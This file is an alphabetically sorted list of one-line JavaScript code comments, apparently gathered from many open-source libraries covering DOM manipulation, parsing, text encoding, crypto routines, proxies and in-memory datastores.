// Generated by `bin/generate-identifier-regex.js`.
// Generated by `tools/generate-identifier-regex.js`.
// Generated by generate-xhtml-entities.js. DO NOT MODIFY!
// Generated column.
// Generated data for sbcs codec. Don't edit manually. Regenerate using generation/gen-sbcs.js script.
// Generated on Fri Dec 16 2016 13:09:51 GMT+0000 (UTC)
// Generated to original
// Generates an inverted token on first use
// Generation is done by generateExpression.
// Generation is done by generateStatement.
// Generic root element
// Get *real* offsetParent
// Get a promise for this deferred
// Get a promise resolved when queues of a certain type
// Get and set the style property on a DOM Node
// Get bytes
// Get correct offsets
// Get document width or height
// Get domain."
// Get each top-level item.
// Get excess from tokenize (recursively)
// Get initial elements from seed or context
// Get input
// Get number of padding bytes from last byte
// Get numbers within <b> tags using XRegExp.matchChain
// Get response data
// Get the (decoded) attribute
// Get the Nth element in the matched element set OR
// Get the character code of the current character and add 13 to it If it is
// Get the connection or open a new one without upgrade.
// Get the current context of the database;
// Get the final matcherOut by condensing this intermediate into postFinder contexts
// Get the first element of an array. Passing **n** will return the first N
// Get the last element of an array. Passing **n** will return the last N
// Get the line scale.
// Get the next highest power of 2
// Get the next highest power of 2 to prevent increasing hwm excessively in
// Get the parent
// Get the root of character tree according to first character of the sequence.
// Get the socket & request paths from the URL
// Get the specific value for the option
// Get the whole matched element set as a clean array
// Get transport
// Gets
// Gets all values
// Gets filled from jar.store.getAllCookies():
// Getting min and max key descendants
// Getting min and max keys
// Git repositories for Acorn are available at"
// Give the component that originally created this child.
// Give the init function the jQuery prototype for later instantiation
// Gives the permutation of all possible domainMatch()es of a given domain. The
// Gives the permutation of all possible pathMatch()es of a given path. The
// Global (browser)
// Global string search/replacement
// Go to next trie node.
// Goals:
// Good!
// Grab a reference to the function declaration we just parsed.
// Grab necessary hook if one is defined
// Grab the token right after.
// Gradient / Pattern Stubs
// Great for tabbed views.
// GroupName ::
// GroupSpecifier ::
// Groups the object's values by a criterion. Pass either a string attribute
// HACK...
// HANDLE: $(#id)
// HANDLE: $(DOMElement)
// HANDLE: $(function)
// HANDLE: $(html) -> $(array)
// HTML 5 draft specifications
// HTML Events
// HTML attribute selector
// HTML empty attribute
// HTML5 UI element states (form controls)
// HTML5 custom data-* attrs
// HTML5 rules says selected options also match
// HTMLCollection/NodeList
// HTMLFrameElement init function (see: level2/html.js).
// HTMLLinkElement implements LinkStyle
// HTMLMediaElement and HTMLVideoElement back-ported from Facebook's Jest project:
// HTMLStyleElement implements LinkStyle
// HTTP
// HTTP Archive Request Object
// HTTP endpoint for the proxy to connect to
// HTTP parser is hooked up...
// HTTP/HTTPS proxy to connect to
// HTTPS
// HTTPS endpoint for the proxy to connect to
// HYPHEN = end boundary
// Hack to emit end on close because of a core bug that never fires end
// Hack to have stream not keep the event loop alive.
// Hackish way of checking if object is Date (this way it works between execution contexts in node-webkit).
// Hacky.
// Half the allowed file descriptors
// Handle FQDN.
// Handle HTML strings
// Handle SVG
// Handle Uint8Array
// Handle `QuantifiableAssertion Quantifier` alternative.
// Handle a deep copy situation
// Handle about:blank with a simulated load of an empty document.
// Handle all cases to make sure that there's only one slash between
// Handle cache's special case and crossDomain
// Handle case when target is a string or something (possible in deep copy)
// Handle cases where value is null/undef or number
// Handle default values.
// Handle error...
// Handle errors
// Handle event binding
// Handle falsy url in the settings object (#10093: consistency with old signature)
// Handle firing indexes
// Handle if value is a function
// Handle invocations in a tight loop.
// Handle it asynchronously to allow scripts the opportunity to delay ready
// Handle most common string cases
// Handle multiple events separated by a space
// Handle page text content
// Handle queue: false promises
// Handle received data...
// Handle rules nested in @media or @supports
// Handle state
// Handle the basic code points
// Handle the basic code points.
// Handle the basic code points: let `basic` be the number of input code
// Handle the global AJAX counter
// Handle the precedence of `tt.coalesce` as equal to the range of logical expressions.
// Handle when the DOM is ready
// Has all
// Has any
// Hash final blocks
// Have / include
// Headers (they are sent all at once)
// Height/width overflow pass
// Hello
// Helper function that takes the already fixed cordinates.
// Helper function to continue chaining intermediate results.
// Helper function to deal with the migration of Attr to no longer have a nodeName property despite this codebase
// Helpers.
// Here is a simple object with an (unnecessarily roundabout) squaring method
// Here we need to decide whether the reprinted code for newNode
// Here we store the last mapping.
// Here's how this works:"
// Hex form
// Hex number starts with '0x'.
// Hidden Archive   -a-h-
// High XOR low
// Hold (or release) the ready event
// Hook needed; redefine it so that the support test is not executed again.
// Hook not needed (or it's not possible to use it due
// Hook used by React ART
// Hooks for boolean attributes
// Hostname
// Hostnames are composed of series of labels concatenated with dots, as are all"
// How long to wait after last user input to search remotely
// How long to wait to establish a proxy connection. (defaults to 30 seconds)
// However, even in such a pathological case, only a single written chunk"
// Hyphen (char code 45) can be part of an identifier.
// I considered making SpreadElement and SpreadProperty subtypes
// I wasn't able to construct a string to make the heuristc find this charset.
// ID find and filter
// ID selector
// IDN labels.
// IE 8 does not throw here
// IE 8 has a broken defineProperty
// IE 9's matchesSelector returns false on disconnected nodes
// IE < 9 does not support Array#slice on collections objects
// IE <= 8 doesn't allow backrefs greater than \99 in regex syntax
// IE doesn't make error fields non-enumerable
// IE fails in reading:
// IE has `focusin` and `focusout` events which bubble.
// IE returns zIndex value as an integer.
// IE throws on elements created in popups
// IE v7-8 (not v6 or v9) throws an Error rather than SyntaxError
// IE will fail on defineProperty
// IE will trigger focus change if element is not blurred before hiding
// IE won't copy toString using the loop above
// IE won't render arches drawn counter clockwise if xStart == xEnd.
// IE-only attribute that controls focus behavior
// IE-only attribute that specifies security restrictions on an iframe
// IE11 xhr.send(undefined) sends 'undefined' string as POST payload (instead of nothing)
// IE8 does not implement getModifierState so we simply map it to the only
// IE8 has no API for event capturing and the `onScroll` event doesn't
// IE8 input.
// IE8 only supports accessing cssFloat (standard) as styleFloat
// IE8 throws error here and will not see later tests
// IE8-9 doesn't update selected after form reset (#2551)
// IE8: When updating a just created node with innerHTML only leading
// IE9 broken
// IE9 claims to support the input event but fails to trigger it when
// IE9 has no XHR2 but throws on binary (trac-11426)
// IE<9
// INITIALIZATION
// INTERFACES FROM THE DOM
// IPv4
// IPv4/IPv6/Hostname
// IPv6
// IPv6 address and IPv4 mask
// IPv6 mask and IPv4 addr
// IPv6 serializer
// ISO 8601 format
// IV setup
// Idea Distribution Ratio = 0.74851/(1-0.74851) =2.98"
// Idea Distribution Ratio = 0.98653 / (1-0.98653) = 73.24"
// Ideal Distribution Ratio = 0.74851/(1-0.74851) =2.98"
// Ideal Distribution Ratio = 0.79135/(1-0.79135) = 3.79"
// Ideal Distribution Ratio = 0.92635 / (1-0.92635) = 12.58"
// Identifer can not contain backslash (char code 92).
// Identifier or keyword. '\uXXXX' sequences are allowed in
// Identifiers never need parentheses.
// If I find time I'll rewrite this to be fully streaming as well
// If `locations` option is on:
// If `ranges` option is on:
// If `variable` is not specified wrap a with-statement around the generated
// If a NodePath object for the elements array has never been created
// If a char was set before - make it a single-char subsequence.
// If a complex binding pattern is encountered (e.g., object and array"
// If a component renders to null or if another component fatals and causes
// If a hook was provided get the computed value from there
// If a hook was provided get the non-computed value from there
// If a new binding matching the catch parameter name was
// If anyone ever complains about this, then I guess the strategy could"
// If both a `host` and `path` are specified then it's most
// If both a `host` and `path` are specified then it's most likely
// If conv2 outputs current
// If expecting a statement and finding a slash operator, parse a"
// If it is a node unlikely to be stringify-ed or looped over
// If it is a pre-release it will bump up to the same patch version.
// If it satisfies the range it is not outside
// If it's a function
// If not assume projection is an object and callback undefined
// If oldNode is not an inclusive ancestor of the referenceNode
// If prev can be converted to accepted input
// If previous value didn't exist - remove it
// If someone feels ambitious maybe make this into an npm package.
// If something was passed but it's not a SmartBufferOptions object
// If the 'async' keyword is not followed by a '(' character or an
// If the WebSocket is closed before the following send is attempted
// If the comment is a //-style comment and indented more
// If the current capture has a name
// If the edge version comparator has a operator then our version
// If the function contains CallExpression nodes involving
// If the function is called with a non-BIND_NONE bindingType, then"
// If the last character before oldLoc and the first character of newLines
// If the last character of newLines and the first character after oldLoc
// If the lowest version comparator has an operator and our version
// If the node is a MethodDefinition or a .method or .shorthand
// If the node is an export declaration and its .declaration has any
// If the statement does not start with a statement keyword or a
// If the store is new then increment the version (if needed).
// If the title argument is not omitted:
// If the transaction aborts now its due to not being able to
// If the user pushes more data while we're writing to dest then we'll end up
// If the value of the named property is a function then invoke it;
// If the value of this path is some child of a Node and not a Node
// If the version is not the default one
// If there are no pending requests just destroy the
// If there is dataShow left over from a stopped hide or show
// If there is no 'error' event listener then throw.
// If this node needs parentheses and will not be wrapped with
// If this type of node cannot come lexically first in its enclosing
// If this.visitWithoutReset threw an exception and
// If upstream compatibility is important don't use this method
// If we are in <template> then add all children to the parent's _templateContents; skip this virtual root node.
// If we are under maxSockets create a new one.
// If we called this again:
// If we don't already have classes
// If we encounter an escaped % then don't increase the array index
// If we found a closing parenthesis but it occurred after the
// If we found a dataType
// If we found an opening parenthesis but it occurred before
// If we got to 4 chars without being able to detect a BOM we
// If we happened to read() exactly the remaining amount in the
// If we have pending requests and a socket gets closed a new one
// If we haven't marked this string as being specially serialized (i.e.
// If we see a => next then someone was probably confused about
// If we try to replace the argument of a ReturnStatement like
// If we're here with a time that is more than 28 hours into the
// If you provide a source map that was generated from a previous call
// If you really want the pretty-printer to use tabs instead of
// If you want esprima not to throw exceptions when it encounters
// If you want esprima to generate .range information (recast only
// If you want to use both draft-04 and draft-06/07 schemas:
// Ignore CompositeComponent proptype check.
// Ignore Esprima-specific 'raw' property.
// Ignore Esprima-specific 'regex' property.
// Ignore falsy values and Expressions.
// Ignore nested replacement ranges.
// Ignore non-index properties.
// Ignore padding
// Ignore the rest of the response
// Illegal: \01 \02 and so on
// Illegal: \1 \2
// Immediately overwrite the uninitialized buffer with data from another buffer
// Implement the driver here.
// Implement the identical functionality for filter and not
// Implementation derived from TweetNaCl version 20140427."
// Implemented accoring to W3C Draft 22 August 2012
// Implicit key determined by the index in the set
// Implies default.
// ImportNamespaceSpecifier and ImportDefaultSpecifier nodes.
// Important to specify callback here to make sure filesystem synced
// ImportedBinding
// In
// In DOM terms:
// In IE 11 fullscreen elements inside of an iframe have
// In IE/Edge using regex groups here causes severe slowdowns.
// In Node.js environment you need to set boundary in the header field 'Content-Type' by calling method `getHeaders`
// In Safari 8 documents created via document.implementation.createHTMLDocument
// In a transform stream, the written data is placed in a buffer.  When"
// In case of duplex streams we need a way to detect
// In cases where either:
// In cases where the decoder did not receive enough data
// In most cases we rely exclusively on isSupertypeOf to make O(1)
// In order to ensure we reprint leading and trailing program
// In order to return the same Def instance every time Type.def is called
// In quirks mode css class names are case insensitive.
// In standards mode they are case sensitive. See docs:
// In the case that `dom` contains nodes that already exist in other
// In version 37 they had a broken version where PNGs (and possibly
// In-memory only datastore
// In-page `selector#id sibing-combinator selector` fails
// In: x = {class: 2};
// In: x.class = 3;
// Incantations
// Include even hidden options in `optargs` so that bash
// Include function arg identifiers in the scope boundaries of the
// Include this.depth in the name to make sure the name does not
// Included in the Unicode Base addon
// Includes inherited fields.
// Includes own typeName.
// Includes own typeName. Populated during finalization.
// Includes some event props shared by KeyEvent and MouseEvent
// Inclusive time is not useful for many components without knowing where
// Incomplete surrogate pair - only lead surrogate found.
// Incomplete surrogate pair - only trail surrogate found.
// Increment counter
// Increment internal Buffer read offset
// Increment internal Buffer write offset;
// Incrementally adds only escaped chars, adding other chunks as-is"
// Indentation contexted
// Index didn't change
// Index in nested array
// Index in selector
// Index is removed
// Index of currently firing callback (modified by add/remove as needed)
// IndexedDB support is broken and different from Blink's.
// Indicates this field is hidden from eachField iteration.
// Inferred from Babylon's tsParseTypeMember method.
// Infinity: 4423.300ms
// Informational
// Inherit all properties from the object by replacing the `Function` prototype
// Init HMAC
// Init hasher
// Init sbox
// Init the event handler queue if we're the first
// Initial connection ignores this as sock is undefined. Subsequent connections re-use the first proxy socket to form a chain.
// Initial permutation
// Initial values
// Initialization and round constants tables
// Initialize IndexedDB; fall back to vendor-prefixed versions
// Initialize IndexedDB; fall back to vendor-prefixed versions if needed.
// Initialize PRNG if environment provides CSPRNG.
// Initialize a jQuery object
// Initialize a singleton container for all running localForages.
// Initialize against the default document
// Initialize central reference
// Initialize empty function node.
// Initialize localStorage and create a variable to use throughout
// Initialize the SVG elements since we know they'll always need to be wrapped
// Initialize the bridge
// Initialize the configuration options
// Initialize the connection process only when
// Initialize the defaultProps property after all mixins have been merged.
// Initialize the pool with junk if needed.
// Initialize the public class
// Initialize the sandbox bridge
// Initialize the state
// Initialize the state.
// Initialize this word array
// Initializer's prototype is the subtype object
// Inject data generated from fallback path into the synthetic event.
// Inject the `Proxy-Authorization` header if necessary.
// Inject the element directly into the jQuery object
// Inject the runtime into a devtools global hook regardless of browser.
// Input: aBuf is a string containing all different types of characters
// Insert `n` at position `i` of the output
// Insert `n` at position `i` of the output.
// Insert a new element at index 5 in a list of nodes:
// Insert a new node before/after the seventh node in a list of nodes:
// Insert callback into url or form data
// Insert in left subtree
// Insert in right subtree
// Insert new leaf at the right place
// Inserting some data
// Insertion
// Inside Firefox
// Inspect recursively
// Inspired by https://github.com/LiosK/UUID.js"
// Install callback
// Install callbacks on deferreds
// Install script dataType
// Installed and uninstalled states for `XRegExp.addToken`
// Installing build dependencies and require them
// Instance methods
// Instance-specific data
// Intentional use of != to avoid catching zero/false.
// Intentionally global; it's the global thread pool that's an issue."
// Intentionally let the error be thrown if parseHTML is not present
// Interface
// Intermediate hash value
// Internal conversion functions:
// Internal implementation of a recursive `flatten` function.
// Internal method so you don't have to go through the public API
// Internal recursive comparison function for `isEqual`.
// Internet Explorer + the HTML object element + W3C DOM methods do not combine: fall back to outerHTML
// Internet Explorer and Edge do not support colors.
// Interpret and default an options object
// Introduced in DOM Level 2:
// Introduced in DOM Level 3:
// Inv swap 2nd and 4th rows
// Invalid auth method range
// Invalid base64 digit.
// Invalid dates are coerced to `NaN`.
// Invert the keys and values of an object. The values must be serializable.
// Inverts a list of Unicode code points and ranges
// Invoke a method (with arguments) on every item in a collection.
// Invoke the leading edge.
// Iota
// Is a given object a finite number?
// Is a given value a DOM element?
// Is a given value a boolean?
// Is a given value an array?
// Is a given value equal to null?
// Is a given variable an object?
// Is a given variable undefined?
// Is firebug? http://stackoverflow.com/a/398120/376773
// Is firefox >= v31?
// Is the DOM ready to be used? Set to true once it occurs.
// Is the given value `NaN`? (NaN is the only number which does not equal itself).
// Is webkit? http://stackoverflow.com/a/16459606/376773
// It also includes optional pos and sticky arguments
// It has been adapted here for stricter adherence to RFC 3986
// It is a declaration.
// It is a helper prober for the use of the Hebrew model probers
// It is a syntax error if any other properties have a name
// It is a syntax error if any other properties have the same name as a
// It is also done this way as a slight performance increase instead of using a
// It is an expression.
// It is an ugly unfortunate mess of history.
// It is just a slash or a drive letter with a slash
// It is known.
// It is possible to parse multiple files into a single AST by
// It only checks the path strings.
// It seems a linked list but it is not
// It should not recurse.
// It starts by sorting the words by length."
// It turns out that some (most?) JavaScript engines don't self-host
// It works for all file types including symlinks since it
// It'll be called only once (for each different options object).
// It's actually a generic Buffer
// It's common for client code to pass the same options into both
// It's important that the callback is called outside try/catch
// It's important that we build the array of ancestors before calling any
// It's possible to pass any number of additional arguments when calling the
// It's your responsibility to call this.traverse with some
// Iterate over all items in the store.
// Iterate over all items stored in database.
// Iterate over current buffer to convert already stored Buffers:
// Iterate over the keys and setup the new object
// Iterate the system
// Iterate the system four times
// Iterations
// Iteratively approximate from a nonzero starting point
// Its start and end offset
// Its type
// JIS X 0212 - Supplementary plane of 6067 chars in 94x94 plane. 1990. Effectively dead.
// JIS X 0213 - Extension and modern replacement of 0208 and 0212. Total chars: 11233.
// JS doesn't support [#x10000-#xEFFFF]
// JSBN-specific extension
// JSHint would error on this code due to the Symbol not being defined in ES5.
// JSON object here to protect the cached source map from outside
// JSON source map.
// JSON-pointer: https://tools.ietf.org/html/rfc6901
// JSX extensions below.
// Japanese frequency table, applied to both S-JIS and EUC-JP"
// JavaScript engine analysis
// JavaScript language.  Implementation of an emoji-capable xml parser
// JavaScript primitives
// Javascript
// Jump to a given area.
// Jump to end and forget the data so .add doesn't re-fire
// Just in case the AST has been modified to contain falsy
// Just need to add these types:
// Just want a regular SmartBuffer with all default options?
// K
// KOI8-R language model
// Kahn's algorithm
// Karma configuration
// Keep a copy of the old load method
// Keep a reference to the top-level scope so we can chain methods that implicitly 
// Keep an empty list if we have data for future add calls
// Keep at least one block in the buffer for unpadding
// Keep backreferences separate from subsequent literal numbers
// Keep domManip exposed until 3.0 (gh-2225)
// Keep pipe for back-compat
// Keep references to cloned scripts for later restoration
// Keep the identity function around for default iterators.
// Keep the leftmost match only
// Keep this function's `arguments` available through closure
// Keep tokens separated unless the following token is a quantifier
// Keep track of where the utf8 sentinel was found
// Keeping only the given fields
// Keeping only the given fields but removing _id
// Key schedule row counter
// Key setup
// Key string
// Keyword token types.
// Kick off the DOM ready check even if the user does not
// Known Issues:
// L3dmip37+NWEi57rSnFFypTG7ZI25Kdz9tyvpRMrL5E=
// LANG_T['error']);   return }
// LIFO order
// LOAD_AS_DIRECTORY(X)
// LOAD_AS_FILE(X)
// LOAD_INDEX(X)
// LOGO
// LSExceptionCode
// Labels in scope.
// Last character of the reprinted node.
// Last fire value for non-forgettable lists
// Last line of every data file is usually blank so not really corrupt
// Last-Modified header cache for next request
// Latin Extended-A block.
// Latin-1 Supplement block.
// Lazily create the child cache. This also cheapens cache
// Lazy load all encoding definitions.
// Lazy loaded to improve the startup performance.
// Lazy-add the new callback in a way that preserves old ones
// Leading `^` or `(?:)^` (handles /x cruft)
// Leading byte
// Leaf
// LeftHandSideExpression
// Legacy Interface
// Legacy JavaScript
// Legacy `process.binding('util')` for Node.js < 10.
// Legacy aliases to convert functions
// Legacy behavior - set `async` property on the function
// Legacy hook TODO: Warn if this is accessed
// Legacy ref
// Legacy support for v0.3.1 and earlier.
// Len is always even.
// Length === 1
// Length is the combined lengths of all the buffers in the list.
// Length of suffix matching the invert condition.
// Length provided
// Let doc be a new document that is an HTML document.
// Let next be the first node following oldParent (excluding any children of oldParent).
// Let reference be the context object.
// Let's be paranoid and check all cases...
// Let's say our datastore contains the following collection
// Let's say the database contains these 4 documents
// Let's turn this function declaration into a variable declaration.
// Let- or const-style binding
// Level2/core clean off empty nodes
// Leverage slice if possible
// Leverage the exponentiation by squaring algorithm for a faster repeat.
// Licensed under the Apache License, Version 2.0 (the ""License"");"
// Limits zlib concurrency for perf.
// Linear inheritance hierarchy.
// Linear inheritance hierarchy. Populated during finalization.
// Linear search. Performance is inversely proportional to the number of
// Lines are stored 0-based
// Lines.prototype will be fully populated.
// List of HTML entities for escaping.
// List of all events that the parser emits
// List options explicitly to be clear which are passed through
// Listen for established event so we can re-emit any excess data received during handshakes.
// Listen for incoming UDP packets from the proxy server.
// Listen to events
// Listeners and Instances are two parallel arrays that are always in sync.
// Literal identifying the imported-from module.
// Little-known fact: the `this` object inside a default function
// Load & create GB18030 tables when needed.
// Load GB18030 ranges.
// Load Node primitive extensions.
// Load Plugin
// Load WebShell
// Load entry module and return exports
// Load extensions in Node. All of them are omitted in Browserify build via 'browser' field in package.json.
// Load method categories.
// Load paramaters
// Load plugins
// Load streaming support in Node v0.10+
// Load tables.
// Load the FP build for immutable auto-curried iteratee-first data-last methods.
// Load the core build.
// Load the full build.
// Loading it in a separate process that we will crash before finishing the loadDatabase
// Local document vars
// Locate the position of the desired element
// LocationPath will eat up the name from a function call.
// Lodash aliases.
// Log the last module results
// Logging callbacks
// Login Packet Type/ID
// LoneUnicodePropertyNameOrValue
// LoneUnicodePropertyNameOrValue ::
// Long option
// Look for any animations in the old queue and finish them
// Look for evidence that the received buffer is either logical Hebrew or
// Look up the keys of the object.
// Look up whether this option is 'selected'
// Lookahead / Lookbehind
// Lookup in current trie node.
// Lookup table for coercing string data-* attributes to their corresponding
// Lookup tables
// Loop is broken within first iteration.
// Loop through all key/value pairs; {local: 'forage'} set
// Loop through all the selected options
// Loop through children appending to the array until we hit depth
// Loop through the attributes
// Loop variable
// Looseness is ignored here.  star is always as loose as it gets!
// Low surrogate.
// METHODS
// METHODS for [ImplicitThis] hack
// MIT License
// MKD is optional
// MS Edge pretends to be Chrome 42:
// Magic theory: IE8 supposedly differentiates between added and updated
// Main decoding loop: start just after the last delimiter if any basic code
// Main encoding loop:
// Main method
// Main source: https://www.w3.org/TR/encoding/#gbk-encoder
// Maintain internal state
// Maintain original order
// Maj
// Make Array say that they are Array
// Make RegExps say that they are RegExps
// Make a writable jQuery.Event from the native event object
// Make absolutely sure the calling code does not attempt to reprint
// Make bin/acorn executable
// Make dates with properties first say the date
// Make error with message first say the error
// Make functions say that they are functions
// Make numeric if forced or a qualifier was provided and val looks numeric
// Make prev buf overlap a little to make it easier to slice later.
// Make sure it's a FunctionDeclaration (optional).
// Make sure it's not a disconnected DOM node
// Make sure only one 'error' event is fired for the lifetime of this SocksClient instance.
// Make sure our error handler is attached before userland ones.
// Make sure parentCache[path.name] is populated.
// Make sure peekLineTerminator() starts after 'async'.
// Make sure textarea (and checkbox) defaultValue is properly cloned
// Make sure that attribute selectors are quoted
// Make sure that nothing sneaks out
// Make sure that null and NaN values aren't set (#7116)
// Make sure that re-using the options doesn't screw things around
// Make sure that we're working with the right name
// Make sure the linked list only shows the minimal necessary information.
// Make sure to read the caveat below.
// Make sure we can put message into an encoded message of emLen bytes
// Make sure we don't miss the end event for paused 0-length streams
// Make sure we don't support bogus drivers.
// Make sure we only access the accessor once as required by the spec
// Make sure we set .type before any other properties (setting .value
// Make sure we set the data so it isn't changed later
// Make sure we trim BOM and NBSP
// Make sure we update the tween properties later on
// Make the decision: is it Logical or Visual?
// Make the deferred a promise
// Make the nodeset a forward-direction-only one.
// Make the same message as V8.
// Make the same messages as V8.
// Make value of this field explicit since
// Makes anchor jumps happen with smooth scrolling.
// Makes the call idempotent
// Making sure our original tests work
// Mangle content
// Manually added data to be used by sbcs codec in addition to generated one.
// Manually set the index so as to pick up overlapping matches.
// Manually shove something into the read() buffer.
// Manually updating the localStorage on different variables
// Manually updating the localStorage on the same variable
// Manually updating the localforage default on the different variables (IndexedDB on my machine)
// Manually updating the localforage default on the same variable (IndexedDB on my machine)
// Map keyword names to token types.
// Map minified method names to their real names.
// Map over jQuery in case of overwrite
// Map over the $ in case of overwrite
// Map<Set<value>>
// Mapping table to get frequency order from char order (get from GetOrder())
// Mappings do not contain a field for the last generated columnt. We
// Mappings end at eol
// Maps Mozilla Reflect object to our Esprima parser.
// Maps object to bi-dimensional array
// Mark it as fixed
// Mark scripts as having already been evaluated
// Mark that a method should not be used.
// Masks that select the SBOX input
// Match elements found at the specified indexes
// Match elements unmatched by `matcher`
// Match html or make sure no context is specified for #id
// Matches a Windows-style `\r\n` newline or a `\n` newline used by all other
// Matches a whole line break (where CRLF is considered a single
// Matches dashed string for camelizing
// Matches if field doesn't exist
// Matches strings that look like JSON objects or arrays
// Math.random()-based (RNG)
// MathML - https://bugzilla.mozilla.org/show_bug.cgi?id=491668
// Max digit bits should be <= 30 because we do bitwise ops
// Max safe segment length for coercion.
// Maybe aSource is an absolute URL as returned by |sources|.  In
// Maybe add ({__proto__:null})[name] to throw when name fails in https://tc39.es/ecma262/#sec-topropertykey.
// Maybe local & remote servers aren't on the same timezone (with remote
// Memoize an expensive function by storing its results.
// Merge both test fixtures.
// Merge fbTestFixture in to testFixture
// Message
// Method init() accepts an alternate rootjQuery
// MethodDefinition -> ClassMethod
// Methods guaranteed to produce a unique set when starting from a unique set
// Methods that are curried variants of others.
// Methods used to actually work on the tree
// Methods used to test the tree
// Microdata support. See http://schema.org/docs/gs.html
// Microsoft forgot to hump their vendor prefix (#9572)
// Microsoft's CP936 is a subset and approximation of GBK.
// Mime module keeps changing this :(
// Mimic jQuery's prototype alias for plugin authors.
// Mimic the DOM and return text content as value for `option's`
// Mimic the constructor's `return` behavior.
// Minimal chunk: 2 quads -> 2x3 bytes -> 3 chars.
// Minimally validate the parsed object
// Minimum Visual vs Logical final letter score difference.
// Minimum Visual vs Logical model score difference.
// Minimum characters required to trigger API call
// Minus is absorbed after base64.
// Minus may be absorbed after base64.
// Miscellaneous
// Missing custom_auth_request_handler
// Missing custom_auth_response_size
// Missing/invalid custom_auth_response_handler
// Mix Rcon
// Mix column lanes
// Mix in a 32-bit integer into the pool
// Mix in derived params
// Mix in the current time (w/milliseconds) into the pool
// Mix rows
// Mix surrounding columns
// Mixed case.
// Mixed matching with array and non array
// Mixin options into this
// Mobile Safari does not fire properly bubble click events on
// Mode 438 == 0o666 (compatibility with older Node releases)
// Model Table:
// Modern
// Modern Buffer API
// Modern browser with input or textarea.
// Modifications by Joshua Bell inexorabletash@gmail.com
// Modified by the vm2 team to make this a standalone module to be loaded into the sandbox.
// Modified in DOM Level 3:
// Modify counter values
// Modify the counters
// Modify the result cache.
// Modifying results of insert doesn't change the cache
// Modifying the returned upserted document doesn't modify the database
// ModuleSpecifier
// ModuleSpecifier is StringLiteral.
// Montgomery reduction
// More complex TLD.
// More options handling for requests with no content
// Most SOCKS servers accept 0.0.0.0 as a wildcard address to accept UDP frames from any source.
// Most SOCKS servers accept 0.0.0.0 as a wildcard address to accept any client.
// Most types of statements are recognized by the keyword they
// Mostly S5.1.2 and S5.2.3:
// Mostly just for testing and legacy API reasons
// Move matched elements from seed to results to keep them synchronized
// Move the given value to match[3] whether quoted or unquoted
// Move to the next token
// Moving to a node from outside the window.
// Mozilla Parser API before.
// Mozilla/Netscape seems to prefer am3
// Much faster and more consistent
// Multi remove
// Multi update
// Multi-Selects return an array
// Multifunctional method to get and set values of a collection
// Must access selectedIndex to make default options select
// Must explicitly cast values for HAS_SIDE_EFFECTS-properties to the
// Must not be a mouse in or mouse out - ignoring.
// Must not discard the (non-)printable Enter-key.
// Mutate input array.
// N<=20
// NATIVE_XXXXX true if method exist and is callable
// NB: No relatedTarget if the mouse left/entered the browser window
// NB: These are useful but for now jit-test doesn't do I/O reliably.
// NB: the only way to end up with an entry that is the cwd
// NB: the require() must be after assigning `module.export` because this require() is circular
// NEW in Ajv version 6.0
// NODE_MODULES_PATHS(START)
// NON-STANDARD
// NONSTANDARD: convenience alias for getter: type get(unsigned long index);
// NOT YET IMPLEMENTED
// NOT having a prerelease is > having one
// NOTE - currently the 'cookies.json' file must already exist!
// NOTE: For cases like <p> <p> </p> - First 'p' closes without a closing tag and
// NOTE: Null values reduce hidden classes.
// NOTE: Safari 2.0.x crashes with escaped (\\)
// NOTE: These type checking functions intentionally don't use `instanceof`
// NOTE: class name attribute selectors must always be treated using a
// NOTE: decodeURI will throw on malformed URIs (see GH-32).
// NOTE: elapsedTime is deprecated in favor of .timings
// NOTE: falls through to _var
// NOTE: gnutar and bsdtar treat unrecognized types as 'File'
// NOTE: request wraps tough-cookie cookie jar
// NOTE: responseStartTime is deprecated in favor of .timings
// NOTE: this constructor is not exported
// NOTE: we do not include EADDRINFO because it was removed from libuv in 2014"
// NOTE: we do not include ESOCKETTIMEDOUT because that is from `request` package"
// NO_PROXY case
// NO_PROXY set but empty.
// NaN
// NaN === NaN -> false
// NaN is never equal to anything
// NaN means non-codepoint
// Naive implementation.
// Name of the key.
// NameSpaceImport
// Named EC curves
// Named FunctionExpressions scope their name within the body block of
// Named function.
// Named or numbered backreference with curly brackets
// Named subpattern
// Named subpattern was wrapped in a capturing group
// NamedImports
// Namespaced trigger; create a regexp to match event type in handle()
// Native `AsyncFunction`
// Native handler
// Navigator on that host.
// Need init if jQuery is called (just allow error to be thrown if not included)
// Need to be able to calculate position if either
// Need to handle surrogate pairs.
// Need to return whether a callback was passed or not
// Need to use `readWord1` because '\uXXXX' sequences are allowed
// Need to use an internal function not tied to the executor to avoid deadlock
// Needed by https://dom.spec.whatwg.org/#concept-node-clone
// Needed by https://dom.spec.whatwg.org/#concept-node-equals
// Needed by https://dom.spec.whatwg.org/#dom-element-hasattributes
// Negation inside a character class triggers inversion
// Nested
// Nested array of subdocuments
// Nested documents
// Nested matching
// Nested:
// Netmask('10.16.0.0/12')
// Never proxy if wildcard is set.
// New database
// New property.
// New's precedence is slightly tricky. It must allow its argument
// New's precedence is slightly tricky. It must allow its argument to
// Newline character code for charCodeAt() comparisons
// Next we need to exclude the closing ` from the .loc of the last quasi
// No BOM found. Try to deduce encoding from initial content.
// No Content
// No Header to Swap.
// No change
// No change in second db
// No checking for final letters in the middle of words is done since that case
// No children to visit.
// No contest: we have a leading comment.
// No contest: we have a trailing comment.
// No data in the beginning
// No dirname
// No entries in NO_PROXY (comma).
// No entries in NO_PROXY (multiple whitespace / commas).
// No entries in NO_PROXY (whitespace).
// No error code for this since it is a Warning
// No error thrown
// No event deferrals or buffering along the way!
// No index modified
// No index was modified
// No lower bound
// No need for a crash safe function in the browser
// No operation performed.
// No option ? This can be the sign of a redirect
// No problems if one field to take doesn't exist
// No query used means all results are returned (before the Cursor modifiers)
// No rebalancing needed
// No result
// No side effect on given input
// No skip no query
// No way to predict which results are returned of course ...
// Node
// Node 10 limits http2session.socket methods to ones safe to use with HTTP/2.
// Node < 12
// Node >= 12
// Node authors rewrote Buffer internals to make it compatible with
// Node data
// Node prior to v10 had a very questionable implementation of
// Node type for document fragments (Node.DOCUMENT_FRAGMENT_NODE).
// Node types
// Node v0.8 doesn't have this method.
// Node walkers.
// Node with only one child
// Node with only one child (on the left)
// Node with only one child (on the right)
// Node with two children
// Node-only
// Node.js
// Node.js 0.10 has enumerable non-index properties on buffers.
// Node.js 0.8 hack
// Node.js require:
// Node.js.
// NodeJS
// NodePath object (usually the one passed into the visitor
// Nodes have their start and end characters offsets recorded in
// Non `Object` object instances with different constructors are not equal.
// Non nested documents
// Non-Internet TLD
// Non-direct character
// Non-hidden keys of allFields.
// Non-standard AST node type.
// None of the remaining cases matter if node is falsy.
